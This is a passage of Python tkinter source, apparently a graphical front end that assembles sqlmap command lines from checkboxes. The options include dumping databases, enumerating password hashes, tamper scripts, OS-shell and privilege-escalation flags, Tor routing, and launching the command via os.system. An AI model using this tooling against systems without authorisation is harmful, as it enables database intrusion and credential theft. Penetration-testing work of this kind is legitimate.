            sec_req_sql = ""
        return sec_req_sql

    # --tamper=TAMPER Use given script(s) for tampering injection data
    def f_tamper(self):
        sel = self.tamper.curselection()
        if 0 < len(sel):
            tam_sql = ' --tamper="%s"' % (",".join([self.tamper.get(x) for x in sel]))
        else:
            tam_sql = ""
        return tam_sql

    # --current-user      Retrieve DBMS current user
    @property
    def f_current_user(self):
        sql_current_user = self.chk_current_user_var.get()
        if sql_current_user == "on":
            current_user_sql = " --current-user"
        else:
            current_user_sql = ""
        return current_user_sql

    # --current-db        Retrieve DBMS current database
    @property
    def f_current_db(self):
        sql_current_db = self.chk_current_db_var.get()
        if sql_current_db == "on":
            current_db_sql = " --current-db"
        else:
            current_db_sql = ""
        return current_db_sql

    # -a, --all           Retrieve everything
    @property
    def f_all(self):
        sql_all = self.chk_all_var.get()
        if sql_all == "on":
            all_sql = " --all"
        else:
            all_sql = ""
        return all_sql

    # --is-dba            Detect if the DBMS current user is DBA
    @property
    def f_is_dba(self):
        sql_is_dba = self.chk_is_dba_var.get()
        if sql_is_dba == "on":
            is_dba_sql = " --is-dba"
        else:
            is_dba_sql = ""
        return is_dba_sql

    # --users             Enumerate DBMS users
    @property
    def f_users(self):
        sql_users = self.chk_users_var.get()
        if sql_users == "on":
            users_sql = " --users"
        else:
            users_sql = ""
        return users_sql

    # --passwords         Enumerate DBMS users password hashes
    @property
    def f_passwords(self):
        sql_passwords = self.chk_passwords_var.get()
        if sql_passwords == "on":
            passwords_sql = " --passwords"
        else:
            passwords_sql = ''
        return passwords_sql

    # --privileges        Enumerate DBMS users privileges
    @property
    def f_privileges(self):
        sql_privileges = self.chk_privileges_var.get()
        if sql_privileges == "on":
            privileges_sql = " --privileges"
        else:
            privileges_sql = ""
        return privileges_sql

    # --comments          Retrieve DBMS comments
    @property
    def f_comments(self):
        sql_comments = self.chk_comments_var.get()
        if sql_comments == "on":
            comments_sql = " --comments"
        else:
            comments_sql = ""
        return comments_sql

    # --roles             Enumerate DBMS users roles
    @property
    def f_roles(self):
        sql_roles = self.chk_roles_var.get()
        if sql_roles == "on":
            roles_sql = " --roles"
        else:
            roles_sql = ""
        return roles_sql

    # --common-tables     Check existence of common tables
    @property
    def f_common_tables(self):
        sql_common_tables = self.chk_common_tables_var.get()
        if sql_common_tables == "on":
            common_tables_sql = " --common-tables"
        else:
            common_tables_sql = ""
        return common_tables_sql

    # --common-columns     Check existence of common columns
    @property
    def f_common_columns(self):
        sql_common_columns = self.chk_common_columns_var.get()
        if sql_common_columns == "on":
            common_columns_sql = " --common-columns"
        else:
            common_columns_sql = ""
        return common_columns_sql

    # --common-files      Check existence of common files
    @property
    def f_common_files(self):
        sql_common_files = self.chk_common_files_var.get()
        if sql_common_files == "on":
            common_files_sql = " --common-files"
        else:
            common_files_sql = ""
        return common_files_sql

    # --udf-inject     Inject custom user-defined functions
    @property
    def f_udf_inject(self):
        sql_udf_inject = self.chk_udf_inject_var.get()
        if sql_udf_inject == "on":
            udf_inject_sql = " --udf-inject"
        else:
            udf_inject_sql = ""
        return udf_inject_sql

    # --shared-lib     Local path of the shared library
    @property
    def f_shared_lib(self):
        sql_shared_lib = self.chk_shared_lib_var.get()
        if sql_shared_lib == "on":
            shared_lib_sql = ' --shared-lib="%s"' % (self.e_shared_lib.get())
        else:
            shared_lib_sql = ""
        return shared_lib_sql

    # --dbs               Enumerate DBMS databases
    @property
    def f_dbs(self):
        sql_dbs = self.chk_dbs_var.get()
        if sql_dbs == "on":
            dbs_sql = " --dbs"
        else:
            dbs_sql = ""
        return dbs_sql

    # --tables            Enumerate DBMS database tables
    @property
    def f_tables(self):
        sql_tables = self.chk_tables_var.get()
        if sql_tables == "on":
            tables_sql = " --tables"
        else:
            tables_sql = ""
        return tables_sql

    # --columns           Enumerate DBMS database table columns
    @property
    def f_columns(self):
        sql_columns = self.chk_columns_var.get()
        if sql_columns == "on":
            columns_sql = " --columns"
        else:
            columns_sql = ""
        return columns_sql

    # --hostname          Retrieve DBMS server hostname
    @property
    def f_host_name(self):
        sql_host_name = self.chk_host_name_var.get()
        if sql_host_name == "on":
            host_name_sql = " --hostname"
        else:
            host_name_sql = ""
        return host_name_sql

    # --schema            Enumerate DBMS schema
    @property
    def f_schema(self):
        sql_schema = self.chk_schema_var.get()
        if sql_schema == "on":
            schema_sql = " --schema"
        else:
            schema_sql = ""
        return schema_sql

    # --count             Retrieve number of entries for table(s)
    @property
    def f_count(self):
        sql_count = self.chk_count_var.get()
        if sql_count == "on":
            count_sql = " --count"
        else:
            count_sql = ""
        return count_sql

    # --force-dns
    @property
    def f_force_dns(self):
        sql_force_dns = self.chk_force_dns_var.get()
        if sql_force_dns == "on":
            force_dns_sql = " --force-dns"
        else:
            force_dns_sql = ""
        return force_dns_sql

    # --force-pivoting
    @property
    def f_force_pivoting(self):
        sql_force_pivoting = self.chk_force_pivoting_var.get()
        if sql_force_pivoting == "on":
            force_pivoting_sql = " --force-pivoting"
        else:
            force_pivoting_sql = ""
        return force_pivoting_sql

    # --smoke-test
    @property
    def f_smoke_test(self):
        sql_smoke_test = self.chk_smoke_test_var.get()
        if sql_smoke_test == "on":
            smoke_test_sql = " --smoke-test"
        else:
            smoke_test_sql = ""
        return smoke_test_sql

    # --live-test
    @property
    def f_live_test(self):
        sql_live_test = self.chk_live_test_var.get()
        if sql_live_test == "on":
            live_test_sql = " --live-test"
        else:
            live_test_sql = ""
        return live_test_sql

    # --vuln-test
    @property
    def f_vuln_test(self):
        sql_vuln_test = self.chk_vuln_test_var.get()
        if sql_vuln_test == "on":
            vuln_test_sql = " --vuln-test"
        else:
            vuln_test_sql = ""
        return vuln_test_sql

    # --stop-fail
    @property
    def f_stop_fail(self):
        sql_stop_fail = self.chk_stop_fail_var.get()
        if sql_stop_fail == "on":
            stop_fail_sql = " --stop-fail"
        else:
            stop_fail_sql = ""
        return stop_fail_sql

    # --run-case
    @property
    def f_run_case(self):
        sql_run_case = self.chk_run_case_var.get()
        if sql_run_case == "on":
            run_case_sql = " --run-case"
        else:
            run_case_sql = ""
        return run_case_sql

    # --unstable    If the target is unstable
    @property
    def f_unstable(self):
        sql_unstable = self.chk_unstable_var.get()
        if sql_unstable == "on":
            unstable_sql = " --unstable"
        else:
            unstable_sql = ""
        return unstable_sql

    # --results-file    Location of CSV results file in multiple targets mode
    @property
    def f_result_file(self):
        sql_result_file = self.chk_result_file_var.get()
        if sql_result_file == "on":
            result_file_sql = " --results-file"
        else:
            result_file_sql = ""
        return result_file_sql

    # --dump              Dump DBMS database table entries
    @property
    def f_dump(self):
        sql_dump = self.chk_dump_var.get()
        if sql_dump == "on":
            dump_sql = " --dump"
        else:
            dump_sql = ""
        return dump_sql

    # --search            Search column(s), table(s) and/or database name(s)
    @property
    def f_search(self):
        sql_search = self.chk_search_var.get()
        if sql_search == "on":
            search_sql = " --search"
        else:
            search_sql = ""
        return search_sql

    # --dump-all          Dump all DBMS databases tables entries
    @property
    def f_dump_all(self):
        sql_dump_all = self.chk_dump_all_var.get()
        if sql_dump_all == "on":
            dump_all_sql = " --dump-all"
        else:
            dump_all_sql = ""
        return dump_all_sql

    # --statements        Retrieve SQL statements being run on DBMS
    @property
    def f_statements(self):
        sql_statements = self.chk_statements_var.get()
        if sql_statements == "on":
            statements_sql = " --statements"
        else:
            statements_sql = ""
        return statements_sql

    # --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
    @property
    def f_exclude_sys_dbs(self):
        sql_exclude_sys_dbs = self.chk_exclude_sys_dbs_var.get()
        if sql_exclude_sys_dbs == "on":
            sys_dbs_exclude_sql = " --exclude-sysdbs"
        else:
            sys_dbs_exclude_sql = ""
        return sys_dbs_exclude_sql

    # -D DB    DBMS database to enumerate
    @property
    def f_database_enumerate(self):
        sql_database_enumerate = self.chk_database_enumerate_var.get()
        if sql_database_enumerate == "on":
            database_enumerate_sql = ' -D "%s"' % (self.e_database_enumerate.get())
        else:
            database_enumerate_sql = ""
        return database_enumerate_sql

    # -T TBL              DBMS database table(s) to enumerate
    @property
    def f_table(self):
        sql_table = self.chk_table_var.get()
        if sql_table == "on":
            table_sql = ' -T "%s"' % (self.e_table.get())
        else:
            table_sql = ""
        return table_sql

    # -C COL              DBMS database table column(s) to enumerate
    @property
    def f_column(self):
        sql_column = self.chk_column_var.get()
        if sql_column == "on":
            column_sql = ' -C "%s"' % (self.e_column.get())
        else:
            column_sql = ""
        return column_sql

    # -U USER             DBMS user to enumerate
    @property
    def f_user(self):
        sql_user = self.chk_user_var.get()
        if sql_user == "on":
            user_sql = ' -U "%s"' % (self.e_user.get())
        else:
            user_sql = ""
        return user_sql

    # -X EXCLUDECOL       DBMS database table column(s) to not enumerate
    def f_exclude(self, *args):
        sql_exclude = self.chk_exclude_var.get()
        if sql_exclude == "on":
            self.e_exclude.config(state='normal')
            exclude_sql = ' -X "%s"' % (self.e_exclude_value.get())
        else:
            self.e_exclude.config(state='disabled')
            exclude_sql = ""
        return exclude_sql

    # --where=DUMPWHERE   Use WHERE condition while table dumping
    def f_where_dump(self, *args):
        sql_where_dump = self.chk_where_dump_var.get()
        if sql_where_dump == "on":
            self.e_where_dump.config(state='normal')
            where_dump_sql = ' --where="%s"' % (self.e_where_dump.get())
        else:
            self.e_where_dump.config(state='disabled')
            where_dump_sql = ""
        return where_dump_sql

    # --start=LIMITSTART  First query output entry to retrieve
    # --stop=LIMITSTOP    Last query output entry to retrieve
    @property
    def f_start_stop(self):
        try:
            sql_start = self.chk_start_var.get()
            if sql_start == "on":
                param = self.e_start.get()
                start = param.split(',')[0]
                stop = param.split(',')[1]
                start_sql = ' --start="%s" --stop="%s"' % (start, stop)
            else:
                start_sql = ""
            return start_sql
        except ImportError:
            pass

    # --sql-shell         Prompt for an interactive SQL shell
    @property
    def f_sql_shell(self):
        sql_shell = self.chk_sql_shell_var.get()
        if sql_shell == "on":
            shell_sql = ' --sql-shell'
        else:
            shell_sql = ""
        return shell_sql

    # --sql-file=SQLFILE  Execute SQL statements from given file(s)
    def f_sql_file(self):
        sql_f_sql_file = self.chk_sql_file_var.get()
        if sql_f_sql_file == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.var_sql_file.set(filename.name)
        elif sql_f_sql_file == "off":
            self.var_sql_file.set("")
        return

    #  --sql-file=SQLFILE  Execute SQL statements from given file(s)
    @property
    def f_sql_file_read(self):
        sql_file_read = self.var_sql_file.get()
        if sql_file_read != "":
            file_read_sql = ' --sql-file="%s"' % sql_file_read
        else:
            file_read_sql = ""
        return file_read_sql

    # --first=FIRSTCHAR   First query output word character to retrieve
    @property
    def f_first(self):
        sql_first = self.chk_first_var.get()
        if sql_first == "on":
            first_sql = ' --first="%s"' % (self.entry_first.get())
        else:
            first_sql = ""
        return first_sql

    # --last=LASTCHAR     Last query output word character to retrieve
    @property
    def f_last(self):
        sql_last = self.chk_last_var.get()
        if sql_last == "on":
            last_sql = ' --last="%s"' % (self.entry_last.get())
        else:
            last_sql = ""
        return last_sql

    # --check-tor         Check to see if Tor is used properly
    @property
    def f_tor(self):
        sql_tor = self.chk_tor_var.get()
        if sql_tor == "on":
            tor_sql = ' --check-tor'
        else:
            tor_sql = ''
        return tor_sql

    # --tor               Use Tor anonymity network
    @property
    def f_tor_use(self):
        sql_tor_use = self.chk_tor_use_var.get()
        if sql_tor_use == "on":
            tor_use_sql = ' --tor'
        else:
            tor_use_sql = ''
        return tor_use_sql

    # --dump-format=DUMPFORMAT  Format of dumped data (CSV (default), HTML or SQLITE)
    def f_dump_format(self, *args):
        sql_dump_format = self.chk_dump_format_var.get()
        if sql_dump_format == "on":
            self.e_dump_format.config(state='readonly')
            dump_format_sql = ' --dump-format=%s' % (self.e_dump_format_value.get())
        else:
            self.e_dump_format.config(state='disabled')
            dump_format_sql = ""
        return dump_format_sql

    # --encoding=GBK  Character encoding used for data retrieval (e.g. GBK)
    def f_encoding(self, *args):
        sql_encoding = self.chk_encoding_var.get()
        if sql_encoding == "on":
            self.encoding.config(state='normal')
            encoding_sql = ' --encoding="%s"' % (self.encoding_value.get())
        else:
            self.encoding.config(state='disabled')
            encoding_sql = ""
        return encoding_sql

    # --tor-port=TORPORT  Set Tor proxy port other than default
    def f_tor_port(self, *args):
        sql_tor_port = self.chk_tor_port_var.get()
        if sql_tor_port == "on":
            self.e_tor_port.config(state='readonly')
            tor_port_sql = ' --tor-port="%s"' % (self.e_tor_port.get())
        else:
            self.e_tor_port.config(state='disabled')
            tor_port_sql = ""
        return tor_port_sql

    # --tor-type=TORTYPE  Set Tor proxy type (HTTP - default, SOCKS4 or SOCKS5)
    def f_tor_type(self, *args):
        sql_tor_type = self.chk_tor_type_var.get()
        if sql_tor_type == "on":
            self.e_tor_type.config(state='readonly')
            tor_type_sql = ' --tor-type="%s"' % (self.e_tor_type.get())
        else:
            self.e_tor_type.config(state='disabled')
            tor_type_sql = ""
        return tor_type_sql

    # --pivot-column=P..  Pivot column name
    @property
    def f_pivot(self):
        sql_pivot = self.chk_pivot_var.get()
        if sql_pivot == "on":
            pivot_sql = ' --pivot-column="%s"' % (self.e_pivot.get())
        else:
            pivot_sql = ""
        return pivot_sql

    # --eta               Display for each output the estimated time of arrival
    @property
    def f_eta(self):
        sql_eta = self.chk_eta_var.get()
        if sql_eta == "on":
            eta_sql = ' --eta'
        else:
            eta_sql = ''
        return eta_sql

    # --forms             Parse and test forms on target URL
    @property
    def f_forms(self):
        sql_forms = self.chk_forms_var.get()
        if sql_forms == "on":
            forms_sql = ' --forms'
        else:
            forms_sql = ''
        return forms_sql

    # --fresh-queries     Ignore query results stored in session file
    @property
    def f_fresh(self):
        sql_fresh = self.chk_fresh_var.get()
        if sql_fresh == "on":
            fresh_sql = ' --fresh-queries'
        else:
            fresh_sql = ''
        return fresh_sql

    # --parse-errors      Parse and display DBMS error messages from responses
    @property
    def f_parse_errors(self):
        sql_parse_errors = self.chk_parse_errors_var.get()
        if sql_parse_errors == "on":
            parse_errors_sql = ' --parse-errors'
        else:
            parse_errors_sql = ''
        return parse_errors_sql

    # --repair    Redump entries having unknown character marker (?)
    @property
    def f_repair(self):
        sql_repair = self.chk_repair_var.get()
        if sql_repair == "on":
            repair_sql = ' --repair'
        else:
            repair_sql = ''
        return repair_sql

    # --flush-session     Flush session files for current target
    @property
    def f_flush(self):
        sql_flush = self.chk_flush_var.get()
        if sql_flush == "on":
            flush_sql = ' --flush-session'
        else:
            flush_sql = ''
        return flush_sql

    # --charset=CHARSET   Force character encoding used for data retrieval
    def f_charset(self, *args):
        sql_charset = self.chk_charset_var.get()
        if sql_charset == "on":
            self.e_charset.config(state='normal')
            charset_sql = ' --charset="%s"' % (self.e_charset.get())
        else:
            self.e_charset.config(state='disabled')
            charset_sql = ""
        return charset_sql

    # --check-internet    Check Internet connection before assesing the target
    def f_check_connect(self):
        sql_check_connect = self.chk_internet_connect_var.get()
        if sql_check_connect == "on":
            check_connect_sql = ' --check-internet'
        else:
            check_connect_sql = ''
        return check_connect_sql

    # --crawl=CRAWLDEPTH  Crawl the website starting from the target url
    def f_crawl(self, *args):
        sql_crawl = self.chkCrawl_var.get()
        if sql_crawl == "on":
            self.e_crawl.config(state='normal')
            crawl_sql = ' --crawl="%s"' % (self.e_crawl.get())
        else:
            self.e_crawl.config(state='disabled')
            crawl_sql = ""
        return crawl_sql

    # --crawl-exclude=..  Regexp to exclude pages from crawling (e.g. "logout")
    def f_crawl_exclude(self, *args):
        sql_crawl_exclude = self.chk_crawl_exclude_var.get()
        if sql_crawl_exclude == "on":
            self.e_crawl_exclude.config(state='normal')
            crawl_exclude_sql = ' --crawl-exclude="%s"' % (self.e_crawl_exclude.get())
        else:
            self.e_crawl_exclude.config(state='disabled')
            crawl_exclude_sql = ""
        return crawl_exclude_sql

    # --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
    def f_csv_del(self, *args):
        sql_csv = self.chk_csv_del_var.get()
        if sql_csv == "on":
            self.e_csv_del.config(state='normal')
            csv_sql = ' --csv-del="%s"' % (self.e_csv_del.get())
        else:
            self.e_csv_del.config(state='disabled')
            csv_sql = ""
        return csv_sql

    # --table-prefix=T..  Prefix used for temporary tables (default: "sqlmap")
    def f_table_prefix(self, *args):
        sql_table_prefix = self.chk_table_prefix_var.get()
        if sql_table_prefix == "on":
            self.e_table_prefix.config(state='normal')
            table_prefix_sql = ' --table-prefix="%s"' % (self.e_table_prefix.get())
        else:
            self.e_table_prefix.config(state='disabled')
            table_prefix_sql = ""
        return table_prefix_sql

    # --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
    def f_test_filter(self, *args):
        sql_test_filter = self.chk_test_filter_var.get()
        if sql_test_filter == "on":
            self.e_test_filter.config(state='normal')
            test_filter_sql = ' --test-filter="%s"' % (self.e_test_filter_value.get())
        else:
            self.e_test_filter.config(state='disabled')
            test_filter_sql = ""
        return test_filter_sql

    # --preprocess    Use given script(s) for preprocessing of response data
    def f_pre_process(self):
        sql_preprocess = self.chk_preprocess_var.get()
        if sql_preprocess == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.e_preprocess_var.set(filename.name)
        elif sql_preprocess == "off":
            self.e_preprocess_var.set("")
        return

    # --preprocess    Use given script(s) for preprocessing of response data
    @property
    def pre_process_script(self):
        pre_process_script = self.e_preprocess_var.get()
        if pre_process_script != "":
            sql_pre_process_script = ' --preprocess="%s"' % pre_process_script
        else:
            sql_pre_process_script = ""
        return sql_pre_process_script

    # --postprocess    Use given script(s) for postprocessing of response data
    def f_post_process(self):
        sql_post_process = self.chk_post_process_var.get()
        if sql_post_process == "on":
            filename = tkinter.filedialog.askopenfile(mode='r')
            if filename:
                self.e_post_process_var.set(filename.name)
        elif sql_post_process == "off":
            self.e_post_process_var.set("")
        return

    # --postprocess    Use given script(s) for postprocessing of response data
    @property
    def post_process_script(self):
        post_process_script = self.e_post_process_var.get()
        if post_process_script != "":
            sql_post_process_script = ' --postprocess="%s"' % post_process_script
        else:
            sql_post_process_script = ""
        return sql_post_process_script
    # --test-skip=TEST..  Skip tests by payloads and/or titles (e.g. BENCHMARK)
    def f_test_skip(self, *args):
        sql_test_skip = self.chk_test_skip_var.get()
        if sql_test_skip == "on":
            self.e_test_skip.config(state='normal')
            test_skip_sql = ' --test-skip="%s"' % (self.e_test_skip_value.get())
        else:
            self.e_test_skip.config(state='disabled')
            test_skip_sql = ""
        return test_skip_sql

    # --user-agent=AGENT  HTTP User-Agent header
    def f_user_agent(self, *args):
        sql_ua = self.chk_user_agent_var.get()
        if sql_ua == "on":
            self.e_user_agent.config(state='normal')
            ua_sql = ' --user-agent="%s"' % (self.e_ua_value.get())
        else:
            self.e_user_agent.config(state='disabled')
            ua_sql = ""
        return ua_sql

    # --proxy=PROXY     Use a HTTP proxy to connect to the target URL
    def f_proxy(self, *args):
        sql_proxy = self.chk_proxy_var.get()
        if sql_proxy == "on":
            self.e_proxy.config(state='normal')
            proxy_sql = ' --proxy="%s"' % (self.e_proxy_value.get())
        else:
            self.e_proxy.config(state='disabled')
            proxy_sql = ""
        return proxy_sql

    # --output-dir=OUT..  Custom output directory path
    def f_output_dir(self):
        sql_out_dir = self.chk_output_dir_var.get()
        if sql_out_dir == "on":
            dir_name = tkinter.filedialog.askdirectory()
            if dir_name:
                self.e_output_dir_var.set(dir_name)
        elif sql_out_dir == "off":
            self.e_output_dir_var.set("")
        return

    # --output-dir=OUT..  Custom output directory path
    @property
    def set_out_dir(self):
        out_dir = self.e_output_dir_var.get()
        if out_dir != "":
            sql_set_out_dir = ' --output-dir="%s"' % out_dir
        else:
            sql_set_out_dir = ""
        return sql_set_out_dir

    # -r REQUESTFILE      Load HTTP request from a file
    def read_host(self):
        selection = self.varTarget.get()
        file_r = self.urlentry.get()
        if selection == "requestFile":
            load_host = ""
            text = [line.rstrip() for line in open(file_r) if len(line) > 2]
            for x in text:
                if "Host" in x:
                    load_host = x.replace("Host: ", "")
            if load_host == "":
                load_host = "Invalid requestFile :("
        else:
            load_url = self.urlentry.get()
            load_host = urllib.parse.urlparse(load_url).netloc
        return load_host

    # log viewer
    def sqlmap(self, *args):
        load_host = self.read_host()
        # print load_host
        text = open(r"./output/" + load_host + "/log", 'r').readlines()
        pattern = re.compile(
            r'(?m)(^sqlmap(.*)|^---$|^Place:(.*)|^Parameter:(.*)|\s{4,}Type:(.*)|\s{4,}Title:(.*)|\s{4,}Payload:(.*)|\s{4,}Vector:(.*))$',
            re.DOTALL)
        mode = os.O_CREAT | os.O_TRUNC
        f = os.open(r"./output/" + load_host + "/gui_log", mode)
        os.close(f)
        for x in text:
            qq = pattern.sub('', x).strip("\n")
            if len(qq) > 4:
                mode = os.O_WRONLY | os.O_APPEND
                f = os.open(r"./output/" + load_host + "/gui_log", mode)
                os.write(f, qq + '\n')
                os.close(f)

    # load log without query
    # self.chkLog_var with query
    def logs(self, *args):
        logfile = ""
        if self.chkLog_var.get() == "on":
            logfile = "log"
        else:
            logfile = "gui_log"

        load_host = self.read_host()
        # print load_host
        self.sesTXT.delete("1.0", tkinter.END)
        # highlight it
        s = ['available databases', 'Database:', 'Table:', '[*]',
             'database management system users:', 'current user:',
             'database management system users', 'password hashes:',
             'password hash:', 'found databases', 'file saved to:',
             ]
        try:
            log_size = os.path.getsize("./output/" + load_host + "/log")
            if log_size != 0:
                self.sqlmap()
                #
                self.sesTXT.insert(tkinter.END, open(("./output/%s/%s" % (load_host, logfile)), 'r').read())
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                for tagz in s:
                    idx = '1.0'
                    while 1:
                        idx = self.sesTXT.search(tagz, idx, nocase=1, stopindex=tkinter.END)
                        if not idx: break
                        last_idx = '"%s"+%dc' % (idx, len(tagz))
                        self.sesTXT.tag_add('found', idx, last_idx)
                        idx = last_idx
                        self.sesTXT.tag_config('found', font=('arial', 8, 'bold'))
                        self.sesTXT.focus()
            else:
                self.sesTXT.insert(tkinter.END, u"Log-Empty " + load_host + ".")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, u"Log-Not-Found " + load_host + ".")
        return

    # Show current session
    def session(self):
        load_host = self.read_host()
        self.sesTXT.delete("1.0", tkinter.END)
        try:
            session_size = os.path.getsize("./output/" + load_host + "/session")
            if session_size != 0:
                self.sesTXT.insert(tkinter.END, open(r"./output/" + load_host + "/session", 'r').read())
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                self.sesTXT.focus()
            else:
                self.sesTXT.insert(tkinter.END, u"Session-File-Empty " + load_host + ".")
        except (IOError, OSError):
            self.sesTXT.insert(tkinter.END, u"Session-File-Not-Found " + load_host + ".")
        return

    # Target: At least one of these options has to be provided to define the target(s)
    def commands(self, *args):
        global inject, inject, target
        selection = self.varTarget.get()
        tag = self.urlentry.get()
        if selection == "url":
            target = ' --url="%s"' % tag
        elif selection == "logFile":
            target = ' -l "%s"' % tag
        elif selection == "bulkFile":
            target = ' -m "%s"' % tag
        elif "requestFile" == selection:
            target = ' -r "%s"' % tag
        elif selection == "googleDork":
            target = ' -g "%s"' % tag
        elif selection == "direct":
            target = ' -d "%s"' % tag
        elif selection == "configFile":
            target = ' -c "%s"' % tag
        elif selection == "sitemapurl":
            target = ' -x "%s"' % tag
        # Focused options
        try:
            inject = target + self.f_tamper() + \
                     self.f_data + self.f_method() + self.f_read_file_write + self.f_file_dest + \
                     self.f_read_msf_path + self.f_os_cmd + self.f_os_shell + self.f_os_pwn + self.f_os_smbrelay + \
                     self.f_os_bof + self.f_priv_esc + self.f_tmp_path + self.f_file_read + self.set_out_dir + \
                     self.f_reg_read + self.f_reg_add + self.f_reg_del + self.f_reg_key + self.f_reg_value + \
                     self.f_reg_data + self.f_reg_type + self.f_api + self.f_task_id + self.f_database + \
                     self.f_sql_query() + self.f_param_del + self.f_random_agent + self.f_proxy() + \
                     self.f_proxy_cred() + self.f_ignore_proxy + self.f_ignore_redirects + self.f_ignore_timeouts + \
                     self.f_read_proxy_file + self.f_proxy_freq() + self.f_hpp + self.f_cookie_del + self.f_level() + \
                     self.f_risk() + self.f_titles + self.f_hex + self.f_text_only + self.f_code() + self.f_regexp() + \
                     self.f_string() + self.f_not_string() + self.f_time_sec() + self.f_technique() + \
                     self.f_dns_domain() + self.f_second_url() + self.f_second_req() + self.f_optimization + \
                     self.f_predict_output + self.f_keep_alive + self.f_null_connection + self.f_threads() + \
                     self.f_dbms() + self.f_union_cols() + self.f_union_char() + self.f_union_from() + self.f_cookie + \
                     self.read_live_cookies + self.read_load_cookies + self.f_drop_set_cookie + self.f_prefix() + \
                     self.f_suffix() + self.f_user_agent() + self.f_randomize() + self.f_force_ssl + self.f_host() + \
                     self.f_referer() + self.f_headers() + self.read_load_headers + self.read_auth_file + \
                     self.f_auth_cred() + self.f_auth_type() + self.f_delay() + self.f_time_out() + self.f_retries() + \
                     self.f_safe_url() + self.f_skip_urlencode + self.f_eval_code() + self.f_chunked + \
                     self.f_header() + self.f_ignore() + self.f_safe_post + self.f_safe_req + \
                     self.f_safe_freq + self.f_csrf_token() + self.f_csrf_retries() + self.f_csrf_method() + \
                     self.f_csrf_data() + self.f_csrf_url + self.f_os() + self.f_skip + self.f_invalid_bignum + \
                     self.f_invalid_logical + self.f_no_cast + self.f_batch + self.f_no_logging + \
                     self.f_save_dump_file + self.f_no_escape + self.f_invalid_string + self.f_current_user + \
                     self.f_current_db + self.f_all + self.f_is_dba + self.f_users + self.f_passwords + \
                     self.f_dbms_cred() + self.f_privileges + self.f_roles + self.f_dbs + self.f_common_tables + \
                     self.f_common_columns + self.f_udf_inject + self.f_common_files + self.f_tables + \
                     self.f_columns + self.f_schema + self.f_count + self.f_force_dns + self.f_force_pivoting + \
                     self.f_smoke_test + self.f_dump + self.f_dump_all + self.f_statements + self.f_search + \
                     self.f_database_enumerate + self.f_table + self.f_column + self.f_user + self.f_exclude() + \
                     self.f_where_dump() + self.f_exclude_sys_dbs + self.f_host_name + self.f_comments + \
                     self.f_start_stop + self.f_first + self.f_last + self.f_verbose() + self.f_sql_shell + \
                     self.f_tmp_dir() + self.f_web_root() + self.f_disable_precon() + self.f_sql_file_read + \
                     self.f_shared_lib + self.f_wizard + self.f_dummy + self.f_debug + self.f_disable_stats + \
                     self.f_profile + self.f_force_dbms + self.f_live_test + self.f_dump_format() + \
                     self.f_encoding() + self.f_vuln_test + self.f_stop_fail + self.f_run_case + self.f_unstable + \
                     self.f_result_file + self.f_z + self.f_alert + self.f_disable_coloring + self.f_last + \
                     self.f_answers() + self.f_finger_print + self.f_banner + self.f_tor + self.f_tor_use + \
                     self.f_tor_port() + self.f_tor_type() + self.f_pivot + self.f_eta + self.f_forms + self.f_fresh + \
                     self.f_parse_errors + self.f_repair + self.f_flush + self.f_charset() + self.f_check_connect() + \
                     self.f_binary_fields() + self.f_crawl() + self.f_csv_del() + self.f_table_prefix() + \
                     self.f_test_filter() + self.f_test_skip() + self.f_crawl_exclude() + self.f_save_traffic_file + \
                     self.f_read_session_file + self.save_config + self.f_scope + self.save_har_file + self.f_beep + \
                     self.pre_process_script + self.post_process_script + self.f_skip_static + self.f_cleanup + \
                     self.f_murphy_rate + self.f_skip_heuristics + self.f_skip_waf + self.f_offline + \
                     self.f_sqlmap_shell + self.f_dependencies + self.f_gpage + self.f_mobile + self.f_page_rank + \
                     self.f_read_crack + self.f_base64 + self.f_base64safe + self.f_purge + self.f_smart + \
                     self.f_test_parameter() + self.f_param_exclude()

        except:
            inject = "select the url checkbox parameter to build the command"
        finally:
            self.sql_var.set(inject)

    # Start configured query for sqlmap.py
    def inject_it(self):
        if os.name == "posix":
            os.system(u'gnome-terminal -- /bin/bash -c \"python3 sqlmap.py %s; exec bash\"' % (self.sqlEdit.get()))
        else:
            os.system(u'start cmd /k python sqlmap.py %s' % (self.sqlEdit.get()))

    def on_find(self):
        target = self.searchEdit.get()
        if target:
            where = self.sesTXT.search(target, tkinter.INSERT, tkinter.END)  # from insert cursor
            if where:  # returns an index
                past_it = where + ('+%dc' % len(target))  # index past target
                self.sesTXT.tag_remove('foo', '1.0', tkinter.END)  # remove selection
                self.sesTXT.tag_add('foo', where, past_it)  # select found target
                self.sesTXT.tag_config('foo', foreground='yellow', font=('arial', 8, 'bold'))
                self.sesTXT.mark_set(tkinter.INSERT, past_it)  # set insert mark
                self.sesTXT.see(tkinter.INSERT)  # scroll display
                self.sesTXT.focus()  # select text widget
            else:
                self.sesTXT.mark_set(tkinter.INSERT, '1.0')
                self.sesTXT.tag_remove('foo', '1.0', tkinter.END)  # remove selection
                self.sesTXT.tag_config('foo', foreground='yellow')
                self.sesTXT.focus()

    def on_find_all(self):
        target = self.searchEdit.get()
        self.sesTXT.mark_set(tkinter.INSERT, '1.0')
        self.sesTXT.tag_remove('foo', '1.0', tkinter.END)  # remove selection
        self.sesTXT.focus()
        if target:
            while 1:
                where = self.sesTXT.search(target, tkinter.INSERT, tkinter.END)

                if where:
                    past_it = where + ('+%dc' % len(target))
                    self.sesTXT.tag_add('foo', where, past_it)
                    self.sesTXT.tag_config('foo', foreground='yellow', font=('arial', 8, 'bold'))
                    self.sesTXT.mark_set(tkinter.INSERT, past_it)
                    self.sesTXT.see(tkinter.INSERT)
                    self.sesTXT.focus()
                else:
                    break

    # Hotkey Alt + 1 2 3 4 5
    def alt_key_1(self, *args):
        return self.noBF.select(tab_id=0)

    def alt_key_2(self, *args):
        return self.noBF.select(tab_id=1)

    def alt_key_3(self, *args):
        return self.noBF.select(tab_id=2)

    def alt_key_4(self, *args):
        return self.noBF.select(tab_id=3)

    def alt_key_5(self, *args):
        return self.noBF.select(tab_id=4)

    # s l e h
    def alt_key_s(self, *args):
        return self.nRoot.select(tab_id=0)

    def alt_key_l(self, *args):
        return self.nRoot.select(tab_id=1)

